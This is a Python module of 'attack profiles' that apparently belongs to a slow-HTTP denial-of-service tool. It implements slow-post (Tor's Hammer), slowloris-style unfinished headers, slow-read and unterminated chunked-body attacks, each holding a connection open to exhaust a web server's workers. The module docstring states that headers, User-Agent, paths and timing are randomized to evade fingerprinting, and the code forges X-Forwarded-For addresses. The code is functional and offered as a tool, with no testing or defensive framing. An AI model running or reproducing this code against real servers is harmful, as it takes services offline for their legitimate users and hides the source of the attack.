"""Attack profiles.

Each profile opens one connection and slowly consumes it so that a
vulnerable web server ties up a worker thread/process waiting on it:

* ``slow-post``   - send headers with a big Content-Length, then drip the
                    body one byte at a time (classic Tor's Hammer).
* ``slow-headers``- never finish the request headers (slowloris).
* ``slow-read``   - send a full request, then read the response in tiny
                    chunks with pauses (slow-read / slow-bytes).
* ``chunked``     - send POST with Transfer-Encoding: chunked and drip
                    small chunks without the terminating 0-chunk.

Every connection randomizes its headers, User-Agent, path query and timing
to make the traffic harder to fingerprint.
"""

from __future__ import annotations

import asyncio
import random
import secrets
import string
from abc import ABC, abstractmethod

from .config import Config
from .stats import Stats

_ALNUM = string.ascii_letters + string.digits
_ACCEPTS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
]


def _rand_ip() -> str:
    return ".".join(str(random.randint(0, 255)) for _ in range(4))


def _rand_token(length: int = 8) -> str:
    return "".join(random.choice(_ALNUM) for _ in range(length))


def _rand_hex(length: int = 12) -> str:
    return "".join(random.choice("0123456789abcdef") for _ in range(length))


def _random_header_name(name: str) -> str:
    return "".join(
        ch.upper() if random.random() < 0.5 else ch.lower() if ch.isalpha() else ch for ch in name
    )


def _path(config: Config) -> str:
    if not config.randomize_path:
        return config.path
    separator = "&" if "?" in config.path else "?"
    return f"{config.path}{separator}{secrets.token_urlsafe(6)}"


def _base_headers(config: Config, ua: str) -> list[str]:
    headers = [
        f"Host: {config.header_host}",
        f"User-Agent: {ua}",
        f"Accept: {random.choice(_ACCEPTS)}",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate",
        "Connection: keep-alive",
        "Keep-Alive: 900",
        "X-Requested-With: XMLHttpRequest",
    ]
    if random.random() < 0.5:
        headers.append(f"Referer: https://{config.header_host}/")
    if random.random() < 0.35:
        headers.append("Cache-Control: no-cache")
    if random.random() < 0.25:
        headers.append("DNT: 1")
    if random.random() < 0.25:
        headers.append("TE: trailers, deflate")
    if random.random() < 0.5:
        headers.append(f"X-Forwarded-For: {_rand_ip()}")
    if random.random() < 0.4:
        headers.append(f"X-Trace-Id: {secrets.token_hex(6)}")

    # Add custom headers (skip critical headers that shouldn't be overridden via CLI)
    # custom_headers may be either a dict[str,str] (normal case) or a list[str]
    # (pre-formatted 'Name: Value' strings for programmatic override).
    custom = config.custom_headers
    if isinstance(custom, dict):
        # CLI-sourced: filter out structural headers to prevent accidental corruption
        critical_headers = {"host", "user-agent", "connection"}
        for name, value in custom.items():
            if name.lower() not in critical_headers:
                headers.append(f"{name}: {value}")
    else:
        # Programmatic list: caller takes full responsibility; no filter applied.
        for header in custom:
            headers.append(header)

    return headers


def _dribble(n: int = 1) -> bytes:
    return "".join(random.choice(_ALNUM) for _ in range(n)).encode()


async def _write(writer: asyncio.StreamWriter, data: bytes, stats: Stats) -> None:
    writer.write(data)
    await writer.drain()
    stats.bytes_sent += len(data)


async def _halt(stop: asyncio.Event, config: Config) -> None:
    """Sleep a random delay, but wake early if ``stop`` is set."""
    try:
        await asyncio.wait_for(stop.wait(), timeout=config.random_delay())
    except TimeoutError:
        pass


class Profile(ABC):
    """Base class for attack profiles."""

    name = ""

    @abstractmethod
    async def run(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        config: Config,
        ua: str,
        stats: Stats,
        stop: asyncio.Event,
    ) -> bool:
        """Dribble the connection until ``stop`` fires or the profile ends.

        Returns:
            True if the profile completed successfully, False if interrupted by stop flag.
        """


class SlowPost(Profile):
    name = "slow-post"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Use custom body if provided, otherwise generate random body
        if config.custom_body:
            body = config.custom_body
            length = len(body)
        else:
            length = random.randint(config.base_post_length // 2, config.base_post_length)
            body = None  # Will dribble random data

        headers = _base_headers(config, ua)
        headers.append("Content-Type: application/x-www-form-urlencoded")
        headers.append(f"Content-Length: {length}")
        req = (
            f"{config.method or 'POST'} {_path(config)} HTTP/1.1\r\n"
            + "\r\n".join(headers)
            + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats)

        if body:
            # Send custom body byte by byte
            sent = 0
            while not stop.is_set() and sent < length:
                await _write(writer, body[sent : sent + 1], stats)
                sent += 1
                await _halt(stop, config)
        else:
            # Send random dribble data
            sent = 0
            while not stop.is_set() and sent < length:
                await _write(writer, _dribble(), stats)
                sent += 1
                await _halt(stop, config)

        return not stop.is_set()  # True if completed, False if interrupted


class SlowPostHeaders(Profile):
    name = "slow-post-headers"

    async def run(self, reader, writer, config, ua, stats, stop):
        length = random.randint(config.base_post_length // 2, config.base_post_length)
        headers = _base_headers(config, ua)
        headers.append("Content-Type: application/x-www-form-urlencoded")
        headers.append(f"Content-Length: {length}")
        lines = [f"{config.method or 'POST'} {_path(config)} HTTP/1.1"] + headers
        while lines and not stop.is_set():
            await _write(writer, (lines.pop(0) + "\r\n").encode(), stats)
            await _halt(stop, config)
        if not stop.is_set():
            await _write(writer, b"\r\n", stats)
        sent = 0
        while not stop.is_set() and sent < length:
            await _write(writer, _dribble(), stats)
            sent += 1
            await _halt(stop, config)


class SlowHeaders(Profile):
    name = "slow-headers"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Send the request line with the Host/UA headers but never the
        # terminating blank line, so the request stays "in progress".
        req = f"{config.method or 'GET'} {_path(config)} HTTP/1.1\r\n".encode()
        await _write(writer, req, stats)
        # Send custom headers first (if any), then random X-headers
        if config.custom_headers:
            for header in config.custom_headers:
                await _write(writer, (header + "\r\n").encode(), stats)
                await _halt(stop, config)
        while not stop.is_set():
            key = f"X-{_rand_hex(6)}"
            value = _rand_hex(8)
            await _write(writer, f"{key}: {value}\r\n".encode(), stats)
            await _halt(stop, config)
        return not stop.is_set()  # True if completed, False if interrupted


class SlowRead(Profile):
    name = "slow-read"

    async def run(self, reader, writer, config, ua, stats, stop):
        headers = _base_headers(config, ua)
        req = (
            f"{config.method or 'GET'} {_path(config)} HTTP/1.1\r\n"
            + "\r\n".join(headers)
            + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats)
        while not stop.is_set():
            try:
                chunk = await asyncio.wait_for(reader.read(8), timeout=config.connect_timeout * 2)
            except TimeoutError:
                continue
            if not chunk:  # server closed the connection
                break
            stats.bytes_received += len(chunk)
            await _halt(stop, config)
        return not stop.is_set()  # True if completed, False if interrupted


class Chunked(Profile):
    name = "chunked"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Use custom body if provided, otherwise generate random body
        if config.custom_body:
            body = config.custom_body
            length = len(body)
        else:
            length = random.randint(config.base_post_length // 2, config.base_post_length)
            body = None  # Will dribble random data

        headers = _base_headers(config, ua)
        headers.append("Transfer-Encoding: chunked")
        headers.append("Content-Type: application/x-www-form-urlencoded")
        req = (
            f"{config.method or 'POST'} {_path(config)} HTTP/1.1\r\n"
            + "\r\n".join(headers)
            + "\r\n\r\n"
        ).encode()
        await _write(writer, req, stats)

        if body:
            # Send custom body in chunks
            sent = 0
            while not stop.is_set() and sent < length:
                chunk_size = min(random.randint(1, 4), length - sent)
                chunk = body[sent : sent + chunk_size]
                await _write(writer, f"{chunk_size:x}\r\n".encode() + chunk + b"\r\n", stats)
                sent += chunk_size
                await _halt(stop, config)
        else:
            # Send random dribble data in chunks
            sent = 0
            while not stop.is_set() and sent < length:
                size = random.randint(1, 4)
                payload = _dribble(size)
                await _write(writer, f"{size:x}\r\n".encode() + payload + b"\r\n", stats)
                sent += size
                await _halt(stop, config)

        return not stop.is_set()  # True if completed, False if interrupted


PROFILES: dict[str, type[Profile]] = {
    SlowPost.name: SlowPost,
    SlowPostHeaders.name: SlowPostHeaders,
    SlowHeaders.name: SlowHeaders,
    SlowRead.name: SlowRead,
    Chunked.name: Chunked,
}
